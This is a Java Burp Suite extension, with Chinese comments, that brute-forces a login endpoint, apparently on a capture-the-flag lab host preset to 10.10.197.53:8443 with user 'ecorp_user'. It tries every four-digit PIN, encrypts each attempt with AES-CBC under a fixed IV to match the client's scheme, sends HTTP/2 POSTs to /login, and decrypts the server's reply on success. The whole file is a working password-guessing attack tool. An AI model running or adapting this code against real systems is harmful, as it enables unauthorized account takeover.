package org.example;

import burp.api.montoya.BurpExtension;
import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.HttpService;
import burp.api.montoya.http.message.HttpHeader;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.http.message.responses.HttpResponse;

import javax.crypto.Cipher;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;
import javax.crypto.spec.IvParameterSpec;
import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.net.URLDecoder;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.Base64;
import java.util.List;
import java.util.concurrent.atomic.AtomicBoolean;

public class BruteForce implements BurpExtension {

    private MontoyaApi api;

    // 你的脚本里看起来是固定 IV 的 ASCII '0' * 16
    // 如果真实客户端是 16 个 0x00，请改成 new byte[16]
    private static final byte[] FIXED_IV = "0000000000000000".getBytes(StandardCharsets.UTF_8);

    private final AtomicBoolean stopFlag = new AtomicBoolean(false);

    @Override
    public void initialize(MontoyaApi api) {
        this.api = api;
        api.extension().setName("Burp Password Brute-Forcer (Optimized)");
        SwingUtilities.invokeLater(this::createUI);
    }

    private void createUI() {
        JFrame frame = new JFrame("Brute Force Attack");
        frame.setSize(380, 230);
        frame.setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
        frame.setLayout(new GridBagLayout());
        frame.setResizable(false);

        GridBagConstraints gbc = new GridBagConstraints();
        gbc.insets = new Insets(6, 6, 6, 6);
        gbc.fill = GridBagConstraints.HORIZONTAL;

        // Username
        gbc.gridx = 0;
        gbc.gridy = 0;
        frame.add(new JLabel("Username:"), gbc);

        JTextField usernameField = new JTextField("ecorp_user");
        gbc.gridx = 1;
        gbc.gridy = 0;
        frame.add(usernameField, gbc);

        // Server
        gbc.gridx = 0;
        gbc.gridy = 1;
        frame.add(new JLabel("Server (host:port):"), gbc);

        JTextField urlField = new JTextField("10.10.197.53:8443");
        gbc.gridx = 1;
        gbc.gridy = 1;
        frame.add(urlField, gbc);

        // Buttons
        JButton startButton = new JButton("Start");
        JButton stopButton = new JButton("Stop");
        stopButton.setEnabled(false);

        JPanel btnPanel = new JPanel(new FlowLayout(FlowLayout.CENTER, 10, 0));
        btnPanel.add(startButton);
        btnPanel.add(stopButton);

        gbc.gridx = 0;
        gbc.gridy = 2;
        gbc.gridwidth = 2;
        gbc.fill = GridBagConstraints.CENTER;
        frame.add(btnPanel, gbc);

        JLabel status = new JLabel("Ready.");
        status.setHorizontalAlignment(SwingConstants.CENTER);
        gbc.gridx = 0;
        gbc.gridy = 3;
        gbc.gridwidth = 2;
        gbc.fill = GridBagConstraints.HORIZONTAL;
        frame.add(status, gbc);

        frame.setLocationRelativeTo(null);
        frame.setVisible(true);

        startButton.addActionListener((ActionEvent e) -> {
            stopFlag.set(false);
            startButton.setEnabled(false);
            stopButton.setEnabled(true);

            String user = usernameField.getText().trim();
            String server = urlField.getText().trim();

            new Thread(() -> {
                try {
                    startBruteForce(user, server, status);
                } finally {
                    SwingUtilities.invokeLater(() -> {
                        startButton.setEnabled(true);
                        stopButton.setEnabled(false);
                        status.setText("Done.");
                    });
                }
            }, "bruteforce-thread").start();
        });

        stopButton.addActionListener((ActionEvent e) -> {
            stopFlag.set(true);
            status.setText("Stopping...");
        });
    }

    private void startBruteForce(String username, String serverUrl, JLabel statusLabel) {
        if (username.isEmpty() || serverUrl.isEmpty()) {
            logOut("Invalid input: Username or Server is empty.");
            return;
        }

        HostPort hp = parseHostPort(serverUrl);
        if (hp == null) return;

        // 8443 这种基本就是 HTTPS；如果你明确要 HTTP，把 secure 改成 false
        boolean secure = true;
        HttpService httpService = HttpService.httpService(hp.host, hp.port, true);

        logOut("Starting brute-force on " + hp.host + ":" + hp.port + " (HTTPS=" + secure + ") user=" + username);

        int consecutive5xx = 0;

        for (int i = 0; i <= 9999; i++) {
            if (stopFlag.get()) {
                logOut("Stopped by user.");
                return;
            }

            String password = String.format("%04d", i);
            if (i % 200 == 0) { // UI/日志节流
                setStatus(statusLabel, "Trying: " + password);
            }

            try {
                SecretKey aesKey = generateAESKey();
                String encodedKey = Base64.getEncoder().encodeToString(aesKey.getEncoded());

                String raw = "username=" + username + "&password=" + password;
                byte[] encrypted = encryptAES(raw, aesKey);
                String encodedData = Base64.getEncoder().encodeToString(encrypted);

                String postBody =
                        "mac=" + urlEncode(encodedKey) +
                                "&data=" + urlEncode(encodedData);

                List<HttpHeader> h2 = new ArrayList<>();
                h2.add(HttpHeader.httpHeader(":method", "POST"));
                h2.add(HttpHeader.httpHeader(":path", "/login"));
                h2.add(HttpHeader.httpHeader(":scheme", secure ? "https" : "http"));
                h2.add(HttpHeader.httpHeader(":authority", authorityValue(hp.host, hp.port, secure)));

                h2.add(HttpHeader.httpHeader("content-type", "application/x-www-form-urlencoded"));
                h2.add(HttpHeader.httpHeader("accept", "*/*"));
                h2.add(HttpHeader.httpHeader("user-agent", "Mozilla/5.0 (BurpExtension)"));

                HttpRequest request = HttpRequest.http2Request(httpService, h2, postBody);

                HttpResponse response = api.http().sendRequest(request).response();
                int sc = response.statusCode();
                String body = response.bodyToString();

                if (sc >= 500) {
                    consecutive5xx++;
                } else {
                    consecutive5xx = 0;
                }

                // 500 backoff（避免把服务打到“只剩 500”）
                if (consecutive5xx >= 3) {
                    logOut("Got " + consecutive5xx + " consecutive 5xx; backing off 1500ms...");
                    sleepQuiet(1500);
                    consecutive5xx = 0;
                }

                // 成功判定：按你原逻辑
                if (sc == 200 && body != null && body.contains("result=")) {
                    String decryptedResult = tryDecryptResult(body, encodedKey);
                    logOut("[SUCCESS] password=" + password + " decrypted=" + decryptedResult);

                    SwingUtilities.invokeLater(() ->
                            JOptionPane.showMessageDialog(
                                    null,
                                    "Success!\nPassword: " + password + "\nDecrypted: " + decryptedResult,
                                    "Brute Force Success",
                                    JOptionPane.INFORMATION_MESSAGE
                            )
                    );
                    return;
                }

                // 可选：只在关键点输出，别每次都刷屏
                if (i % 500 == 0) {
                    logOut("Progress: tried=" + password + " status=" + sc);
                }

            } catch (Exception ex) {
                logErr("Error on password " + password + ": " + ex.getMessage());
                // 遇到异常也别疯狂重试，给系统喘口气
                sleepQuiet(60);
            }
        }

        logOut("Brute-force complete (no hit).");
    }

    private String tryDecryptResult(String responseBody, String encodedKey) {
        try {

            int idx = responseBody.indexOf("result=");
            if (idx < 0) return "(no result= found)";
            String tail = responseBody.substring(idx + "result=".length()).trim();

            // 有些响应会带别的参数：result=xxx&foo=bar
            int amp = tail.indexOf('&');
            if (amp >= 0) tail = tail.substring(0, amp);

            String urlDecoded = URLDecoder.decode(tail, StandardCharsets.UTF_8);
            byte[] encryptedBytes = Base64.getDecoder().decode(urlDecoded);

            byte[] keyBytes = Base64.getDecoder().decode(encodedKey);
            return decryptAES(keyBytes, encryptedBytes);

        } catch (Exception e) {
            logErr("Decryption failed: " + e.getMessage());
            return "(decrypt failed: " + e.getMessage() + ")";
        }
    }

    private static String authorityValue(String host, int port, boolean secure) {
        boolean isDefault = (secure && port == 443) || (!secure && port == 80);
        return isDefault ? host : host + ":" + port;
    }

    private String decryptAES(byte[] key, byte[] encryptedData) throws Exception {
        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
        IvParameterSpec iv = new IvParameterSpec(FIXED_IV);
        SecretKey secretKey = new javax.crypto.spec.SecretKeySpec(key, "AES");
        cipher.init(Cipher.DECRYPT_MODE, secretKey, iv);
        return new String(cipher.doFinal(encryptedData), StandardCharsets.UTF_8);
    }

    private SecretKey generateAESKey() throws Exception {
        KeyGenerator keyGen = KeyGenerator.getInstance("AES");
        keyGen.init(128);
        return keyGen.generateKey();
    }

    private byte[] encryptAES(String data, SecretKey key) throws Exception {
        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
        IvParameterSpec iv = new IvParameterSpec(FIXED_IV);
        cipher.init(Cipher.ENCRYPT_MODE, key, iv);
        return cipher.doFinal(data.getBytes(StandardCharsets.UTF_8));
    }

    private static String urlEncode(String s) {
        return URLEncoder.encode(s, StandardCharsets.UTF_8);
    }

    private static void sleepQuiet(long ms) {
        try {
            Thread.sleep(ms);
        } catch (InterruptedException ignored) {
        }
    }

    private void setStatus(JLabel label, String text) {
        SwingUtilities.invokeLater(() -> label.setText(text));
    }

    private void logOut(String msg) {
        api.logging().logToOutput(msg);
    }

    private void logErr(String msg) {
        api.logging().logToError(msg);
    }

    private static String hostHeaderValue(String host, int port, boolean secure) {
        // 可选：默认端口就不写，避免某些服务严格检查 Host
        boolean isDefault = (secure && port == 443) || (!secure && port == 80);
        return isDefault ? host : host + ":" + port;
    }

    private HostPort parseHostPort(String serverUrl) {
        String[] parts = serverUrl.trim().split(":");
        if (parts.length != 2) {
            logOut("Invalid server format. Use host:port (e.g., 10.10.188.207:8443)");
            return null;
        }
        String host = parts[0].trim();
        int port;
        try {
            port = Integer.parseInt(parts[1].trim());
        } catch (NumberFormatException e) {
            logOut("Invalid port: " + parts[1]);
            return null;
        }
        if (host.isEmpty() || port <= 0 || port > 65535) {
            logOut("Invalid host or port range.");
            return null;
        }
        return new HostPort(host, port);
    }

    private static class HostPort {
        final String host;
        final int port;

        HostPort(String host, int port) {
            this.host = host;
            this.port = port;
        }
    }
}
